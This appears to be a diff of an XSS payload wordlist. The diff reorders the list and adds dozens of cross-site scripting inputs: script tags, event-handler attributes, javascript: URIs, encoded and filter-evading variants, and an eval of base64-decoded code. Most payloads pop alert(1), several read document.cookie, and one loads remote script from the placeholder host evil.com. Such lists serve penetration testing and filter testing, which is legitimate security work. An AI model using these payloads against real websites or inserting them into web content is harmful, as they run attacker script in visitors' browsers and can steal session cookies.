@@ -1,30 +1,76 @@
+'"><script>alert(1)</script>
+%3cscript%3ealert(1)%3c/script%3e
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+<<script>alert(1)//<</script>
 <a href="javascript:alert(1)">Click Me</a>
-<body onload=alert(1)>
+<a href="javascript:alert(document.cookie)">click</a>
+<a href=javascript:alert(1)>click</a>
+<a href=javascript:void(0) onclick=alert(1)>click</a>
+<audio src=x onerror=alert(1)>
 <b onmouseover=alert(1)>Hover Me</b>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
 <details open ontoggle=alert(1)>
 <div oncontextmenu=alert(1)>Right Click</div>
+<div style="background:url(javascript:alert(1))"></div>
 <embed src="javascript:alert(1)">
+<embed src=javascript:alert(1)>
 <form><button formaction="javascript:alert(1)">Click
+<form><button formaction=javascript:alert(1)>click</button></form>
 <h1 ondblclick=alert(1)>Double Click</h1>
+<i onmousedown=alert(1)>Click Me</i>
+<iframe onload=alert(1) src=about:blank>
 <iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
 <img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert('xss')>
 <input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus>
+<input onfocus=alert(1) autofocus>
 <input oninvalid=alert(1) required autofocus>
 <input onpaste=alert(1) value="Paste Me">
 <input onsearch=alert(1)>
-<i onmousedown=alert(1)>Click Me</i>
+<isindex action=javascript:alert(1) type=image>
 <isindex formaction="javascript:alert(1)" type=submit>
-javascript:alert(1)
+<keygen onfocus=alert(1) autofocus>
+<link rel=stylesheet href=javascript:alert(1)>
 <marquee onstart=alert(1)>
+<marquee onstart=alert(1)>xss</marquee>
+<math><a xlink:href=javascript:alert(1)>click</a></math>
 <math><x href="javascript:alert(1)">click
 <object data="javascript:alert(1)">
+<object data=javascript:alert(1)>
 <p onclick=alert(1)>Click Me</p>
-'"><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script src=//evil.com/xss.js></script>
+<script>alert(1)</script
 <script>alert(1)</script>
-<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert('xss')</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>setTimeout('alert(1)',0)</script>
+<select onfocus=alert(1) autofocus>
 <span oncopy=alert(1)>Copy Me</span>
+<style>@import 'javascript:alert(1)'</style>
 <style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">
+<svg onload=alert(1)>
+<svg onload=alert(document.domain)>
 <svg/onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+<svg><script>alert(1)</script></svg>
+<svg><set onbegin=alert(1) attributeName=x></set></svg>
+<table background=javascript:alert(1)></table>
 <textarea oncut=alert(1)>Cut Me</textarea>
+<textarea onfocus=alert(1) autofocus>
 <u onmouseup=alert(1)>Click Me</u>
+<video src=_ onloadstart=alert(1)></video>
 <video><source onerror=alert(1)>
+<xss onmouseover=alert(1)>hover</xss>
+javascript://%0aalert(1)
+javascript:alert(1)
+javascript:alert(1)//
